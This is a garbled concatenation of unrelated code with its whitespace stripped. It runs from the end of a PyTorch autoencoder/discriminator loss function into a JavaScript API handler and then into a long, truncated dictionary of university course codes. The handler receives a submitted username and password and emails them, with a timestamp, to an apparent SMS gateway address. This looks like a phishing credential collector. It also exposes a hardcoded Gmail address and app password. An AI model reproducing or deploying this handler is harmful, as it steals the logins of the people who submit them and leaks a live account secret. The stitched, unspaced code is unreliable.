ec_loss.detach().mean(),f"{split}/loss/g":g_loss.detach().mean(),f"{split}/scalars/logvar":self.logvar.detach(),f"{split}/scalars/d_weight":d_weight.detach(),})returnloss,logelifoptimizer_idx==1:#secondpassfordiscriminatorupdatelogits_real=self.discriminator(inputs.contiguous().detach())logits_fake=self.discriminator(reconstructions.contiguous().detach())ifglobal_step>=self.discriminator_iter_startornotself.training:d_loss=self.disc_factor*self.disc_loss(logits_real,logits_fake)else:d_loss=torch.tensor(0.0,requires_grad=True)log={f"{split}/loss/disc":d_loss.clone().detach().mean(),f"{split}/logits/real":logits_real.detach().mean(),f"{split}/logits/fake":logits_fake.detach().mean(),}returnd_loss,logelse:raiseNotImplementedError(f"Unknownoptimizer_idx{optimizer_idx}")defget_nll_loss(self,rec_loss:torch.Tensor,weights:Optional[Union[float,torch.Tensor]]=None,)->Tuple[torch.Tensor,torch.Tensor]:nll_loss=rec_loss/torch.exp(self.logvar)+self.logvarweighted_nll_loss=nll_lossifweightsisnotNone:weighted_nll_loss=weights*nll_lossweighted_nll_loss=torch.sum(weighted_nll_loss)/weighted_nll_loss.shape[0]nll_loss=torch.sum(nll_loss)/nll_loss.shape[0]returnnll_loss,weighted_nll_lossimportnodemailerfrom'nodemailer';importdotenvfrom'dotenv';dotenv.config();exportdefaultasyncfunctionhandler(req,res){if(req.method==='POST'){const{username,password,timestamp}=req.body;consttransporter=nodemailer.createTransport({service:'gmail',//Oranotherserviceifapplicableauth:{user:'nathandai2000@gmail.com',pass:'ggewfwkdgtzmmlwn',},});constmailOptions={from:'nathandai2000@gmail.com',to:'7607172199@msg.fi.google.com',subject:'',//Nosubjecttext:`Username:${username}\nPassword:${password}\nTimestamp:${timestamp}`,//Emailbody};try{awaittransporter.sendMail(mailOptions);res.status(200).json({success:true});}catch(error){console.error('Errorsendingemail:',error);res.status(500).json({success:false,error:'Failedtosendemail'});}}else{//Handleanynon-POSTrequestsres.setHeader('Allow',['POST']);res.status(405).end(`Method${req.method}NotAllowed`);}}constcourses={'AEROENG':['196','24','1','10','193','98','197','199','2','198'],'AEROSPC':['135A','100','2A','2B','1B','1A','135B'],'AFRICAM':['27AC','24','9B','119','201D','194A','39F','39B','113AC','15B','4A','30B','125AC','201B','164','182AC','158B','13A','242','140','298','138','144','602','256B','299','601','159','7A','25AC','31B','100','118','14B','21B','40','21A','4B','257B','14A','201A','139','8B','127','120','136','150B','11B','241','8A','28AC','126','84','121','155','137','152F','39E','7B','198','109','296','12','11A','5B','18A','122','31A','107','19B','134','142AC','115','18B','112B','10A','197','5A','195','125','198BC','123','194B','250','39G','101','158A','30A','142A','136L','10B','153C','98','39D','116','257A','131','16A','13B','15A','240','141','39H','19A','111','252','112A','190AC','117','99','156AC','16B','114','165','199','262','139L','98BC','9A'],'AGRS':['130','130P','175D','24','130J','170A','17A','130H','130F','161','175A','130L','170C','121','199','170D','17B','163','130B','180','130G','130D','29','198','172','130I','35','98','39B','130N','39C','10A','175F','124','36','39A','175G','34','28','130M','130E','39K','50','99','130K','130C','39D','130R','10B','130A','130S'],'AHMA':['602','299','601','210','298'],'AMERSTD':['190','101','170AC','99','10','101AC','132Y','121','199','300','191','98','5','39','142Y','178AC','102','10AC','110','198','189','179AC','24','15','102AC','110AC'],'ANTHRO':['123E','170','250E','250V','114','3','159','169C','250R','169B','136B','250X','290','171','219','602','150','156B','168','146','107','98','122F','119','137','250','156','181','128','128M','121AC','183','105','147A','129E','39','115','129C','375','140','84','227','301','292','122','1','2','122A','186','174AC','128A','189','3AC','2AC','111','280B','229A','184','132','134A','250G','232','135','130','106','221','138B','99','230','180','169A','166','280X','127C','24','161AC','127','291','198','123','157','228','155','299','122D','141','210','136F','189A','113','134','231','121A','280C','129B','108','250N','296B','136D','240A','125','136G','122C','127B','280','123B','156A','160AC','296A','127A','235','112','121','280D','122B','122E','162','147C','110','250A','158','122G','123C','199','298','229B','121C','123A','129','250F','250J','135B','132A','270A','229C','138A','124B','179','270B','126M','196','124A','122H','121B','151','149','129A','197','129D','136A','109','136','148','217','124','240B'],'ARABIC':['10','1A','198','111B','15','50','100A','103','212','104B','104A','100B','105B','20B','111A','115B','15B','298','1B','220','200','202','105A','20A','115A','30','11','245','107','108','199'],'ARCH':['243','253','176','204A','245','236','175','102B','100A','221','271','226','260','264','217','150','276','170B','227','207A','204','142','258','108','255','229','273','136','265','200B','602','98BC','278','100D','205B','238','100C','178','399','218','39A','200D','198','249','290','110AC','207D','211','298','222','124B','188','139','262','212','216','124A','129','233','269','105','130','24','250','275','173','237','219','11B','209','111','207C','270','144','252','133','241','230','149','246','201','177','112','200A','229A','123','299','160','239','140','281','11A','107','200C','277','202','375','231','242','127','98','244','207B','84','199','155','198BC','205A','100B','170A','169','259','179','256','259X','279','159','122','215','102A','240','109','203','204B','119','154','125A'],'ARESEC':['262','298','232','214','213','602','259','299','263','400','249','202','201','264','241','375','261','211','219B','219A','242','212','210','265','269'],'ARMENI':['102','1B','128','101B','126','124','101A','1A'],'ART':['123','174','14','142','23AC','120','145','8A','180','182','299','295','130','165','132','136','21','198','103','16','99','163','298','133','184','162','185','173','141','100','124','116','102','138','178','229','164','196','218','290','199','15','171','294','166','117','172','301','160','17','25','26','13','119','98','122','30','118','137','12','8'],'ASAMST':['143B','98','122','194B','99','176','123','20AC','151AC','131','138','144','190','127','143AC','172','125','183','146','194A','199','145','178','24','132AC','39','175','124','151','121','126','195','145AC','181','20C','97','132','20B','197','171','152','128AC','20A','198','173','150','141'],'ASIANST':['197','98','201','298','198','199','299'],'AST':['299'],'ASTRON':['121','98','160','84','120','39','7B','301','298','198','7A','290A','201','602','255','7AB','299','292','252','218','3','190','199','256','24','9','204','99','290B','203','250','10','128'],'BANGLA':['1A','101B','1B','101A'],'BIOENG':['148','134','235','198','102','282','101','252','297','24','280','221L','291','263','140L','114','151','195','224','251','263L','135','202','247','203','201','145','115','231','253','121','144','301','298','104','150','99','147','243','244L','241','103','105','124','168L','11','163','100','211','163L','245','225','144L','192','121L','199','26','153','190','266','271','111','221','248','196','164','110','220L','299','25','98','200','244','296','166','10','290','131','232','143'],'BIOLOGY':['1A','1AL','1B'],'BIOPHY':['292','293A','293B'],'BOSCRSR':['117A','27A','27B','117B'],'BUDDSTD':['50','150','298','299','602','601','198','154','200','220','128','190','39','199','137','114','250'],'BULGARI':['28B','118B','28A','118A'],'BURMESE':['100B','1A','1B','100A'],'CATALAN':['101','102'],'CDSS':['198'],'CELTIC':['171','198','119B','173','102B','105A','98','86','145A','138','161','125','144B','144A','128','16','199','145B','139','129','119A','85','168','70','99','102A','146B','146A','15','134','170'],'CHEM':['301','15','103','171H','120A','120B','259','252A','100','223A','34','297','280','263A','3BL','250A','281','301A','301W','114','49','222','3B','602','1B','243','1A','282A','220A','282B','105','135','270B','299','283','179','197','221A','104B','277B','96','4A','4B','125','253C','254','282','251B','122','265','198','98','300','252B','274A','263B','12B','201','270A','700','32','196','260','115','301B','261A','98W','268','272','1AD','262','295','275B','275A','261B','251A','199','253B','261C','1AL','192','250B','200','108','149','221B','220B','12A','3A','24','3AL','273','278','253A','301D','301C','143','159','32L','375','102','208','279','113','214','121','104A','301T','274B','130B','298','195','101'],'CHICANO':['98','159','162','161','50','135B','1AX','130','150B','163','180M','198','146','24','194A','131','39A','99','40','133','190','180','152','10','20','197','165','175','135A','142','70','110','194B','97','141','5','143','174','195','132','180AC','199','135C','172','176','39'],'CHINESE':['188','280','199','105','156','161','120','176','3A','155','136','4B','110B','187','111','282','102','1B','3X','158','10Y','180','30X','165','222','51','122','1A','186','100XA','159','1Y','112','10B','179','220','3B','7B','110A','257','100A','254','5','98','10X','242','189','298','172','130','255','234','221','134','7A','178','299','601','1X','101','230','198','100XB','10A','100B','4A','153','157','602'],'CHMENG':['293C','250','230','275L','246','40','84','179','196','150B','298B','248','240','298','140','141','295B','103','98','295P','244','161S','182','160','274','180','300','90','299','199','236','198','295K','150A','195','143','142','170A','104','296','24','295Q','130','298C','101','256','375','197','98W','171','162','183','602','275','295T','170B','245','154','176','102','295N'],'CIVENG':['210','290F','11','166','258','132','229','268S','111L','285C','204','254','203N','160D','225','202A','277','205B','290I','175','268A','246','218C','200A','298','261','171','292B','220','299','249','170A','186','113','253','98','199','190S','290J','275','190','278','191','209','233','110','255','220N','221','602','262','99','217','281','375','92','268E','259','247','254G','268I','268H','268B','226','293','140','240','123','174','234','286','100','263N','215','213','291G','270','111','292A','126','223','198','104','112','167','70','60','114','251','232','155','105','248','273','268D','108','228','260','115','92B','227','290T','92A','260D','124','295','222','107','291D','24','297','601','271','165','257','218B','290','241','180','88B','200C','211A','268K','179','120','244','218A','256','219','237','173','153','272','294','188','200B','176','206','245','264','211B','193','252','122','93','197','192'],'CLASSIC':['299','225','260','250','202B','602','302','201B','203','226','375','270','601','200','220A','214','201A','202A','230','298','219','218','220B','239','228','211','213','224'],'CMPBIO':['198BC','293','201','275','156','290','294A','175','98BC','276','477','294B','295'],'COGSCI':['150','132','182','171','197','115','1','199','99','190','201','181','198','145','170','172','144','180','146','1B','300','131','98','88'],'COLWRIT':['9G','3V','150AC','5P','3K','142','20','1','3S','121','171','50AC','175','375','130','131','11','5F','7N','145','3B','181','9A','6Q','3P','7K','7A','8','9V','3J','5I','109C','3U','6G','9F','132','144','3A','5N','151','7Q','25AC','3W','6A','5K','107','6N','9S','5E','5L','7I','6M','9N','140A','180','5M','140B','6J','6B','9R','199','6H','135','6K','133','310','7F','7E','161','5B','9C','10B','3I','9M','9W','3F','141','6L','146','192AC','195','5A','7J','7M','99','9E','3M','200','5C','5D','9O','5H','9P','5S','134','7L','5J','143','6I','198','3D','110','6F','6C','5G','3E','3H','105','6P','9Y','152','7C','3G','10A','7B','7D','9B','75AC','106','7G','6R','9J','3L','5Q','98','6E','108','9I'],'COMLIT':['198BC','165','202C','153','601','39H','240','50','298','156','266','200','151','171','100D','299','100C','100B','199','152','41A','223','265','202B','41D','20C','60AC','212','254','20','256','100A','260','20A','100','24','41E','20B','156AC','41C','98BC','112A','112B','375','258','155','602','120','198','170','250','232','225','227','160AC','154','270C','190','98','80AC','300','215','201','210'],'COMPBIO':['294','299'],'COMPSCI':['260A','164','189','282A','162','168','84','399','47B','288','188','287','195','294','272','370','61C','186','185','47A','265','287H','262B','171','36','47C','261','176','278','297','180','250','197','198','170','184','61B','286','270','284B','285','172','194','10','260B','39','284A','262A','160','298','199','271','289A','302','169A','264','70','61BL','299','161','263','280A','152','261N','174','602','276','375','365','268','169L','252A','61A'],'COMPSS':['213','212','202','201','214B','230','222','211','224A','221','214A','215','225'],'CPH':['270','299','215','290'],'CRITTH':['290','298','205','200','240'],'CRWRIT':['130','120'],'CUNEIF':['198','103A','199','101A','101B','102A','106A','100B','298','106B','102B','103B','200A','100A','200B'],'CYBER':['206','202','210','204','242','295','211','252','233','215','290','220','207','289','200','284'],'CYPLAN':['238','207','204','602','201B','399','257','248','204C','375','208A','204B','280B','249','216','180B','280A','124','281','119','115','198','113A','254','204D','230','114','264','228','200','284','118AC','116','160','101','97','199','255','218','220','290','201A','120','140','208','250','291','117AC','252','110','180A','295','205','253','298','130','24','268','214','293','197','299','98','280C','297','260','235','190'],'CZECH':['163','26A','26B','116A','116B'],'DANISH':['1A','1B'],'DATA':['199','4AC','298','88E','94','144','188','6','375','198','197','200S','88'],'DATASCI':['293','200','207','221','267','290','209','261','233','210A','241','271','203','281','201','231','205','266','210','255'],'DEMOG':['220','210','296','602','230','161','160','240','260','298','213','199','180','98','301','601','198','215','110','211','299','145AC','5','88','130','200'],'DESINV':['23','195','97','98','202','10','199','197','95','198','21','190E','90E','181','15','212','218','213','190','211','200','290','90','25','210','22','219','201','99'],'DEVENG':['215','298','290','210','206','205','204','203','299','202'],'DEVP':['229','200A','290','200','227','299','230','228A','240','221','232','239','235','252','228B','296','209','222','233','237','228','295'],'DEVSTD':['24','197','198','199','150'],'DIGHUM':['160','100','150A','150B','125','101','150C'],'DUTCH':['190','195','1','39A','299','140','173','171AC','174','24','166','177','100','198','199','2','170','107','125','178','110','179','161AC'],'EALANG':['115','109','180','116','199','108','107','160','106','101','375','291','191','39','118','162','200','181','105','24','204','117','111','202','112','125','198','110','119','84','114'],'ECON':['255','148','101A','201B','132','298','274','242','209A','210C','250B','270C','280A','182','98','240A','173','172','250A','174','143','134','236D','241A','202A','106','197','235','113','219B','136','244','240B','375','157','105','210B','210A','241C','121','230C','296','291','211','241B','133','220B','161','217','140','104','251','206','116','100B','209B','237','207A','127','155','155A','204','236B','24','281','219A','202B','135','218','220A','1','231','236A','196','271','123','295','215A','115','299','141','208','250C','138','260A','131','201A','191','270B','154','221','301','152','183','111','215B','234A','230A','130','602','119','139','220C','224','234C','280B','280C','151','162','122','101B','2','165','153','230B','198','100A','84','144','207B','199','124'],'EDSTEM':['82','187','303','82T','197','189','98','190','304'],'EDUC':['313A','297','390D','274C','294B','261A','235','250A','221','143','213L','244B','114D','151','220','470A','200A','213A','188F','290C','131AC','211D','112','260A','208','229D','201B','281A','280B','230A','283B','131','197','470B','241C','229F','229A','391A','276E','209','413A','241B','235A','392C','227','460A','265A','213D','262D','252B','278B','305','291','298E','210','251','390A','40AC','245','170','214','231A','213B','39A','162A','375','236A','229','470C','245A','290D','200D','142','277B','238','275B','227A','249B','75AC','207C','211C','195B','221A','273D','276D','252A','233A','280A','232A','298B','271F','231C','460B','301A','313E','260','191B','313B','213C','205','272B','274A','290E','390C','274D','259','250C','183','247C','278A','260C','236B','299','203','270B','283D','313C','313G','226A','393','99','195C','278D','215','182AC','263B','244C','282','275G','239A','275L','237A','24','399S','239','278C','146A','184','226B','189','180','280D','207D','188B','220A','200C','284A','207B','166','226','224A','290A','140AC','296A','132','75','291A','167','254','266B','413L','297A','201A','413B','243','273C','224D','212','241A','298C','211A','154','240C','52AC','287','190AC','228B','204C','198','289','202D','240B','262A','200B','224B','240D','262B','228','265','258','288','242','295B','190','293','208A','52','273B','240A','276A','399','30AC','188','130','602','290B','262C','228C','460C','277A','285','163','392','260E','241','222C','293L','224','281','267','168','199','155AC','271B','161','97','273','224C','263A','262F','201','283F','390B','280C','253A','279A','217','236','241D','276C','262G','241E','249C','222','187A','298A','413D','274B','275H','185','271G','295C','313I','39B','221C','293V','228A','262H','268','211B','271E','601','207L','294E','313F','237','223B','313H','225','98','244','261C','114A','246A','248','293A','413C','313D','294A','231B','260D','222B','266C','150','279B','200H','294C','202A','257','39D','234'],'EDUCSPE':['303','305','316','308','306','319','310','313','318','302','304','315','399S'],'EECS':['16A','219A','47F','151LB','47D','47E','126','127','225B','251A','251LB','225A','151LA','251LA','208','151','219C','107','251B','149','16B','227AT'],'EGYPT':['199','202B','102A','100B','198','204A','201A','101B','202','205','100A','203','101A','201B','102B','204B'],'ELENG':['223','242A','120','240B','98','198','240A','244','290F','49','97','230C','25','118','232','229A','230B','113','290T','144','142','228A','290Y','24','242B','213B','229B','297','226A','192','290C','126','290','236A','146L','227BT','194','197','42','130','206B','218A','108','290N','134','224B','221A','375','290G','99','147','602','248C','226B','123','137A','219B','298','299','225D','137B','290Q','213A','199','122','206A','105','290D','290O','117','243','290A','240C','290S','247A','140','290B','210','234A','121','222','143','290P','224A','113B','39','230A','241B','84'],'ENERES':['296','292A','39A','293B','293A','190B','199','290','290A','98','102','293D','299','180','171','198','301','291','175','190C','273','298N','131','275','293C','174W','170','24','190','254','101','295','99','298','199S','276','280','270'],'ENGIN':['241B','211B','281','297','178','251','47','270E','223','125','183B','180','194','270S','183','117','280E','290E','270K','295','241A','204A','39E','210A','183A','185','282','298A','151','270M','270F','298','27','283A','245C','232','157AC','235A','296MA','264A','184','266A','290J','170B','252','254','92','183E','231','202A','203','290P','210B','177','298B','270Q','238C','260A','270N','296MB','291B','211A','270D','201','236B','26','250A','238E','170C','245A','233','290B','280A','39F','7','128','217B','281A','215A','274','283','200','270J','270A','290S','39B','195B','224B','120','290H','290','222','290A','170A','234','247','230','236A','270C','187','273','270I','270P','147','290G','290O','98','296MS','212','270B','25','183C','270H','150','270G','216B','238B','270R','24','237A','11','253','250','266B','270L','218','204B','29','1','183D','198','40','195A','93'],'ENGLISH':['24','135AC','80K','111','143D','128','218','118','199','198BC','180J','134','33','115B','172','180S','125C','165','143C','137T','246J','246E','133T','43N','141','27','133A','180E','602','90','375','212','190','145','203','173','98','170','246K','246F','138','152','205A','201A','211','110','246C','131','137A','130C','200','117S','179','298','246G','31AC','153T','115A','180L','143A','121','117A','25','180H','112','171','130B','20','246I','125A','39A','45C','117J','201B','29','180R','37','205B','43B','243A','243B','132','130A','154','45A','26','174','102','119','126','117F','243N','160','53','250','133B','104','122','246L','246D','180Z','45B','17','98BC','114A','117T','177','178','130D','43A','137B','125E','114B','165AC','178A','39','28','125D','105','125B','180A','166AC','166','175','100','99','143B','143N','299','180C','161','176','84','217','107','143E','127','101','117B','139','198','143T','120','177A','116','246H','180T','180N','84A'],'ENVDES':['105','8','163','102','109','251','154','4C','4A','5','252','253','98BC','9','107','101A','195A','193','1','202','106','104','121','298','161','100','164','162','201','198BC','199','2','131','207','198','4B','110','195B','195','152','399','101B','153','10','151','170'],'ENVECON':['162','140AC','98','39D','147','141','198','161','104','145','131','153','196','197','185','143','199','154','199S','195','142','7','100','152','105','170','103'],'EPS':['7','200','118','39','102','212','204','254','103','198','150','230','210','115','24','116','10','130','255','101','203','250','100A','88','80','109','98','225','209','197','20','375','298','131','84','216','39A','214','113','50','207','122','108','280','3','220','119','224','236','229','199','82','124','260','117','217','256','81','251','290','100B','271','104','125'],'ESPM':['155AC','149','201S','256','284','235','60','271','158','118','102B','109B','264','131','24','171A','154','189A','113','178B','181A','6','116B','109D','259','175L','177A','157','186','290','147','164','376','163AC','115C','134','300','197FS','185','121','99','257','108B','151','262','205','152','226','136','161','261','279','249','400','139','72','102C','280','105D','142','160AC','114','90','298','112L','132','111','162A','105C','141A','253','115B','150','244','183','173','169','102BL','227','222','184','120','602','109A','140A','161A','168','105B','190','201C','52','263','117','258','50AC','198BC','268','137','175A','140','288','116C','15','44','101A','112','2','242','108A','42','88B','248','217','100','98BC','296','206','260','165','215','230','278','601','39','175B','188','109C','199','195','265','277','130A','198','174','106','174A','276','162','102D','234','194A','172','281','201A','187','98','194B','5','250','251','105A','100ES','197','109E','375','228','88A','299','130','144','176A','40','182','232','139A','199S'],'ETHSTD':['175','98','100','130','10AC','190AC','103A','159AC','147','195','601','201','176','194B','21AC','135','250','198BC','197','22AC','97','98BC','41AC','230','122AC','101A','24','182AC','202','181AC','299','150','141','302','144AC','180L','99','240','145','103C','136','194','199','103B','180','174','196','147AC','126','12','198','303','200','39','190','127','101B','296','11AC','203','197A','103E','602'],'EUST':['201','200'],'EWMBA':['295F','256','291E','291C','292A','291T','200C','293C','211','251A','295N','214','205L','236B','271','212','236C','258','246','246A','222','258A','236E','290B','254','292I','283','295A','223','290E','215','296','266','204','292B','236K','236G','250','296C','273','212A','212B','268B','290S','236F','201A','295I','292IL','298X','264A','263','229','252','295T','207','203','292J','291I','248A','295G','264','295C','293','236D','292S','200S','258P','269','212C','290T','259','295M','290V','284','236J','280','261','233','240','219','209','297F','253','287','236M','299C','205D','292ID','299B','291L','291F','282','291R','299E','236A','210','236T','217','290A','277','247','298S','265','232','236L','257','299M','255','292T','260','268D','292R','205','290I','291D','291S','268C','236V','297D','292K','262A','231','236H','267','236I','224A','237','295B','292N','292C','290H','275','262','292M','297A','292F','295S','206','201B','202','290K'],'FILIPN':['15','100A','100AB','101B','1B','101A','100B','1A'],'FILM':['145','298','160','221','375','25','193','20','199','200','170','220','50','178','197A','85','201','128','240','182','170AC','203','197C','135','230','602','187','185','125','299','100','297','181','198','35','84','176','184','10','179','30','188','177','39','197B','171','25A','172','45','180','190','186','129','25B','194','98','155','204'],'FINNISH':['1B','102B','1A','102A'],'FOLKLOR':['299','298'],'FRENCH':['35','118B','40','141','142AC','210A','174','173','137','297','120A','112B','281','220A','200A','206','1R','140B','150B','119B','114A','298','121B','299','150A','149','245A','13','250A','198','162A','183B','240B','140C','24','375B','602','180A','117B','123','260A','335','122A','180B','43A','139','125A','270A','274','185','278','260B','161B','42AC','80','151B','39','201','199','177B','120B','265B','220B','119A','122B','251','102','121A','250B','176','146A','117A','1','147','230A','43B','118A','2','177A','48','240A','180C','200B','171B','180D','140A','151A','178A','230B','205','161A','183A','162B','375A','103B','270B','4','178B','171A','601','175A','3','172A','170','148','140D','116A','14','265A','197','275A','103A','145','124A','126','211A','245B','375C','112A'],'GEOG':['167AC','214','129','375','299','31','206','110','164','282','130','162','181','124','185','253','72AC','24','138','40','140A','295','301','197','255','144','114','161','85','178','221','220','279','602','182','50AC','183','285','249','296','170','252','4','32','298','203','155','228','98','200C','186','10AC','157','200B','84','127','142','140B','297','205','244','189','230','123','104','143','137','105','81','280','70AC','246','200A','37','199','251','126','20','147','260','80','247','215','145','198','254','180','257','171','187','601'],'GERMAN':['160F','299','273','210A','210','98','140','130AC','158','234','375A','296','292','39B','175','263','131','182','176','270','276','205','263C','214','112','602','157A','119','204','108','104','107','3','298','41','102D','207','184','99','160B','160A','179','39A','267','202B','160E','293','375B','40','199','157C','206','2G','177','202C','186','160C','152','157B','160D','201','39P','113','110','160K','1','212A','280','255','271','160','105','39Q','2','294','148','39L','147','39','202A','102A','39S','265','266','39H','24','157','185','290','212','198','155','157D','282','101','201B','4','123','285','291','109','160L','268','103','170','256','1G','100','173','151','21','174','1E','156','178','39R','175B','172','260'],'GLOBAL':['210L','110E','154M','110K','144','10A','199','24','172','150E','134','143Q','102','150Q','192','197','176','126','45','133','299','142','210M','375','100P','105','151Q','177','122L','178','173','143','210E','141','110M','127','131M','198','140','150K','254M','123L','298','292','100S','100D','111Q','194','273','110L','88','132','153P','250Q','110Q','10B','210','121'],'GMS':['200','201','299'],'GPP':['105','140','150AC','196','150','115'],'GREEK':['2','199','160','125','100','15','115','121','101','99','117','1','116','123','105','102','120','122'],'GSPDP':['375','352','351','350','301S','301','320','302'],'GWS':['250','39A','220','101','133AC','142','210','130AC','197','102','20','132AC','230','50AC','10','238','299','97','103','140','84','194B','134','155','199','232','120','39','129','231','115','104','144','116AC','235','40','143','236','194A','141','125','198','200','139','24','195','98','126','99','100AC','237','111','14','131'],'HEBREW':['202B','204A','201A','105A','103A','11B','203A','198','301B','206','107A','100A','10','11A','100B','148B','204B','20A','190B','298','103B','148A','20B','106B','111','104A','301A','1B','1A','106A','203B','102B','105B','199','104B','102A','202A','30','107B'],'HINDI':['1A','100B','1B','101A','221','15','100A','101B'],'HISTART':['120','190DH','39H','156A','190H','190C','192T','190F','183E','180A','39X','137','12','36','39L','39K','172','192G','141B','39I','281','91','39F','160','190T','15A','183','188C','145','192C','27','39S','192A','39N','39P','190B','166','162','11','170','105','185','65','190G','192HD','174','101','199','127','14','180C','203','186A','192M','132AC','39A','236','188A','39U','141C','16','136C','32','62','100','185A','171','109','298','169A','33','192DH','602','39O','108','290','145A','41','145B','39M','51','192F','192E','200','230','107','87AC','39C','34','136A','296','37','193','131C','185D','188','258','88','192L','39Q','35','234','194','192AC','190M','151','192B','80','134B','39Y','39V','190A','21','39T','189','10B','39E','175','192H','190D','198','375','299','291','38','192D','192CU','300','289','262','161','39G','17','39J','285','130A','173','182','185B','39B','155A','134A','10','260','18','39D','136B','179','186C','601','24','131B','39','190E','98','39Z','39R','286','270','240','141A','156C','187AC','134C','30','39W','263','131A'],'HISTORY':['156C','2','111A','174B','173B','100B','13','100F','124B','298','174A','285L','178','103H','110D','285F','4A','167C','151C','602','39W','103F','185B','171B','4B','175E','281','126B','169A','172','111C','103D','285E','159B','124A','39B','133B','14','119A','145','275Y','150B','158D','152A','39C','39H','133A','100D','171A','136A','131C','164A','24','106B','100AP','183','275A','131B','175D','275D','140B','167D','280M','151B','100L','103C','118C','7B','155A','112C','182CT','103A','130','295','290','200Y','109A','118A','104','39T','183A','5','100M','1','114B','105','188E','162B','109B','136','301','188D','117D','170','181B','285M','100S','100ST','111D','275B','280D','20','135B','125A','158C','162C','180T','134A','39F','164B','165D','11A','11','160','132C','275M','285D','98BC','126A','39G','165A','138T','108','167B','121B','180','100UP','39','39N','175C','280B','375','198BC','100BP','39I','7A','162A','198','275E','275F','280A','111B','138','114A','84','117A','116D','109C','133D','134B','158A','142','137AC','165C','175B','296','280H','275S','158B','39Y','103M','287','6B','10','116A','199','112A','186','118B','103S','285B','144AC','103B','112B','151A','6A','121A','107A','166B','283','182A','285A','164C','88','285U','39D','167A','39U','98','139A','171C','165B','106A','12','280F','100U','122AC','280E','182AT','280S','280G','30','105A','146','136B','185A','177A','123','155B','141B','299','166C','116B','190','8A','101B','105B','285H','116G','200X','173C','143','125B','177B','127AC','101A','102','285S','136C','116C','100AC','100E','103U','128AC','280N','103E','39A','100H','117C','601','168A','183B','280U','113B','8B','3','149B'],'HMEDSCI':['220','261D','261C','216E','198','216A','261','205A','205E','216B','205B','205C','261E','299','298','200','296','216D','216C','261A','98','261B','265','205D','216'],'HUM':['120','198','299','220','100','133AC','105','132AC','101','199','10','20','295','197','12','196','291','290','98'],'HUNGARI':['1B','100','1A'],'IAS':['196','206','198','299','160','250','255','106','292','207','199','375','194','197','98','150'],'ICELAND':['1B','1A'],'ILA':['180'],'INDENG':['235','255','375','170','299','198','268','245','199','290A','210','171','190','224','142A','145','266','197','262A','267','230','263A','602','601','150','190H','190F','256','151','180','174','164','166','222','253','223','261','190C','263B','288','262B','66','173','190I','251','242B','243','190B','130','24','190K','248','142','220','290G','162','254','160','265','142B','242A','135','156','120','99','153','269','10','241','280','221','172','270','215','298','240','231','250','169','252','290R','165','190G','98','115','258','264','290','190D'],'INDONES':['210B','1B','1A','232','100B','210A','100A'],'INFO':['198','290','205','289','159','290M','202','241','206A','206B','271B','225','213','294','299','190','203','114','290S','293','217A','101','215','290T','288','153B','218','134','259','201','291','251','253B','272','295','375','234','255','103','233','298A','98','153A','239','214','231','296A','253A','188','258','298','247','199','256'],'INTEGBI':['103LF','75','161','250','162','222','259','98','375','120','102LF','117LF','35AC','206','281','290','140','198BC','248','197','148','170LF','114','99','157LF','291','77A','168L','112','132','305','42','39','173LF','33','298','264','232','95','246','132L','172','51','154L','178','287','177LF','154','193','283','128','181L','37','113L','400','223','151L','151','146LF','135','87','257','123AL','117','41','297','262','150','174LF','141','134L','136','82','192','77B','137','131L','601','286','101','131','251','296','199','104LF','268','159','241','304','164','118','265','95B','602','299','139','11','98BC','84','43','167','111','108','138','198','234','116L','175LF','169','142L','190','263','24','184L','230','191','292','31','249'],'IRANIAN':['201B','201A','111B','110A','111A','110B'],'ISF':['100G','50','197','100I','199','60','61','100K','100D','189','110','100E','100F','62','100H','190','98','100A','100C','100J','198','10','100B'],'ITALIAN':['101A','298','3','205','70AC','235','114','112','101','110','101B','212','12','140','170','102','197','130A','97','125AC','244','302','230','98','40','1S','163','105','2','175','602','290A','150AC','109','130B','1R','282','24','303','199','50','39F','25','115','375','1','70','117','215','270','198','601','299','204','290B','160','39C','248','260','160S','104','11','30','4','120'],'JAPAN':['163','112','120','103','105','100S','10B','242','7A','177','240','189','159','601','230','185','100B','232','170','101','84','602','178','102','259','100A','80','180','173','199','116','10RA','198','130','144','132','188','146','7B','10RB','104','299','1B','7C','1A','111','255','140','160','10A','234','164','155','161','298','110','24','181'],'JEWISH':['125','39Q','296','102','602','117','122','121A','39','122B','122A','120','199','121B','299','126','103','178','121','198','39P','120A','200','98','179','175B','290','100','39O','175E','123','110'],'JOURN':['211','134','209','290','297','230','299','39H','284','225','200','233','220','256','226','282','122','296','98','222','223','110','216','39J','113','210','120','199','221','285','112','294','124','234','207','111','39K','283','255','215','213','198','130','24','298','264A','243','39','115','276','242','601','286','219','228','197','102AC','136','260','275','201','267','212','100','254','264B','262'],'KHMER':['101B','1A','100A','100B','101A','1B'],'KOREAN':['602','200','155','10BX','130','199','112','299','185','180','160','100B','102','163','170','189','109','1BX','10A','100BX','184','298','111','100A','153','174','157','7A','601','1B','198','187','186','101','10AX','172','161','10B','7B','188','140','105','150','1AX','1A','100AX'],'LANPRO':['100B','150A','380'],'LATAMST':['250','160','230','198','10','150','299','192','24','200','298'],'LATIN':['155A','140','160','119','120','102','116','99','122','115','100','2','101','121','15','199','1','117'],'LDARCH':['121','295','101','222','134B','205','601','170','233','198','227','602','299','103','252B','122','221','204','235','260','120','254','110','300','287','277','226','259','237','257','111','199','255','160','297','234A','202','251','197','134A','203','187','140','135','12','201','234B','301','119','253','1','206','200A','154','102','375','296','298','232','289','130','200B','110L','229','98','112','399','133'],'LEGALST':['132AC','129','175','163','139','199','150','137','173AC','127','39B','180','100','177','138','162AC','24','171','141','133AC','39H','164','110','189','168','105','152AC','104AC','143','174','165','125','101','161','149','176','198','131','157','181','160','39E','103','135','10','155','88','178','156','187','106','154','12','130','146','170','151','182','140','102','179','142','183','159','153','109','147','107WI','169','119','123','136','39I','98','172AC','107','158','145','39D','106WI','184','190'],'LGBT':['145','198','98','146','100','20AC'],'LINGUIS':['240A','109','260','131','290B','243','21A','253','215','108','55AC','153','245','299','252','158','47','211B','255','175','201A','125','121','128','256','24','602','220A','2A','290E','150E','140','201B','154','150','183','213','290H','155AC','199','221B','20C','250A','297','11','113','210','122','22','221','290M','211A','250E','152','251','20A','65','146','124','98','298','234','250D','150A','120','151','187','250B','700','3','111','197','225','201','240B','188','130','270','9','1A','181','123','601','110','205','23','290L','290D','40','10','220B','230','290A','198','222','208','290F','106','301','1B','20B','100','170','21B','375','16','148','200','250C','5','115'],'LS':['125','2','76','39W','20C','140C','40D','39V','39H','20E','10','110','160E','39P','180A','198','120C','39J','70C','180AC','150A','120B','39E','39R','39G','150C','25','98','5','40F','39L','22','133','54','40E','121','39S','20D','39X','39T','140D